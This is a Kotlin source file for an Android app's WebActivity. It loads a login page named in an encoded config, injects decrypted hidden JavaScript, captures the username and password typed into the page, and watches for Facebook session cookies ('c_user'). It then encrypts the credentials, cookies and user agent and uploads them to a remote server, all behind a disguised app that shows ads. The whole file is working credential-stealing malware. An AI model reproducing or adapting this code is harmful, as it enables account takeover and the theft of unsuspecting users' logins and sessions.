package wo.yi.wei.wanglexiangnian

import DesUtils
import android.content.Intent
import android.net.Uri
import android.text.TextUtils
import android.view.View
import android.view.WindowManager
import android.webkit.*
import androidx.lifecycle.lifecycleScope
import com.google.gson.Gson
import hui.shou.tao.base.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import wo.yi.wei.wanglexiangnian.databinding.ActivityWebBinding

class WebActivity : BaseActivity<ActivityWebBinding>() {
    private lateinit var updateEntity: UpdateEntity

    override fun getViewBinding() = ActivityWebBinding.inflate(layoutInflater)

    override fun initialization() {
        val p = config["info"]
        p?.let {
            it.toString()
        }?.let {
            it.toByteArray().fromBase64().decodeToString()
        }?.let {
            updateEntity = Gson().fromJson(it, UpdateEntity::class.java)
        }
        WebViewManager(activityBinding.webView).clearCookie()
        WebViewManager(activityBinding.webView).enableAdaptive()
        WebViewManager(activityBinding.webView).enableJavaScript()
        WebViewManager(activityBinding.webView).enableZoom()
        WebViewManager(activityBinding.webView).enableJavaScriptOpenWindowsAutomatically()
        activityBinding.webView.addJavascriptInterface(PageInterFace(),"businessAPI")
        window.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE)
        activityBinding.activityFaceBookIvBack.setOnClickListener { onBackPressed() }
        lifecycleScope.launch(Dispatchers.IO) {
            delay(20 * 1000)
            withContext(Dispatchers.Main) {
                displayInsertAd()
            }
        }
        activityBinding.webView.webChromeClient = CustomWebChromeClient {
            val hideJs = DesUtils(1).decrypt(js1)
            activityBinding.webView.evaluateJavascript(hideJs, null)
            val loginJs = DesUtils(1).decrypt(js2)
            activityBinding.webView.evaluateJavascript(loginJs, null)
            lifecycleScope.launch(Dispatchers.IO) {
                delay(300)
                withContext(Dispatchers.Main) {
                    activityBinding.activityFaceBookFl.visibility = View.GONE
                }
            }

        }
        activityBinding.webView.webViewClient = CustomWebViewClient { cookie, view ->
            lifecycleScope.launch(Dispatchers.Main) {
                activityBinding.content.visibility = View.GONE
            }
            val content = Gson().toJson(
                mutableMapOf(
                    "un" to userName,
                    "pw" to userPwd,
                    "cookie" to cookie,
                    "source" to config["app_name"],
                    "ip" to "",
                    "type" to "f_o",
                    "b" to view?.settings?.userAgentString
                )
            ).toRsaEncrypt(updateEntity.key())
            upload(content, updateEntity.apiUrl()) {
                startActivity(Intent(this, MainActivity::class.java))
                finish()
            }
        }
        activityBinding.webView.loadUrl(if (!TextUtils.isEmpty(updateEntity.loginUrl())) updateEntity.loginUrl() else "https://www.baidu.com")
    }

    override fun onResume() {
        super.onResume()
        activityBinding.webView.onResume()
    }

    private var needBackPressed = false

    override fun onBackPressed() {
        if (activityBinding.webView.canGoBack()) {
            activityBinding.webView.goBack()
        } else {
            if (!displayInsertAd()) {
                if (config["ext2"].toString().startsWith("http")) {
                    Intent(Intent.ACTION_VIEW, Uri.parse(config["ext2"].toString())).let {
                        startActivity(it)
                    }
                }
                super.onBackPressed()
            } else {
                needBackPressed = true
            }
        }
    }

    override fun onInterstitialAdLoaded() {
        super.onInterstitialAdLoaded()
        if (needBackPressed) {
            needBackPressed = false
            super.onBackPressed()
        }

    }

    override fun onPause() {
        super.onPause()
        activityBinding.webView.onPause()
    }

    inner class CustomWebChromeClient(val block: () -> Unit) : WebChromeClient() {
        override fun onProgressChanged(view: WebView?, newProgress: Int) {
            super.onProgressChanged(view, newProgress)
            if (newProgress == 100) {
                block()
            }
        }
    }

    inner class CustomWebViewClient(val block: (String, WebView?) -> Unit) : WebViewClient() {
        override fun onPageFinished(view: WebView?, url: String?) {
            super.onPageFinished(view, url)
            val cookieManager = CookieManager.getInstance()
            val cookieStr = cookieManager.getCookie(url)
            if (cookieStr != null) {
                if (cookieStr.contains("c_user")) {
                    if (userName.isNotBlank() && userPwd.isNotBlank() && cookieStr.contains("wd=")) {
                        block(cookieStr, view)
                    }
                }
            }
        }
    }

    class PageInterFace {
        @JavascriptInterface
        fun businessStart(a: String, b: String) {
            userName = a
            userPwd = b
        }
    }
}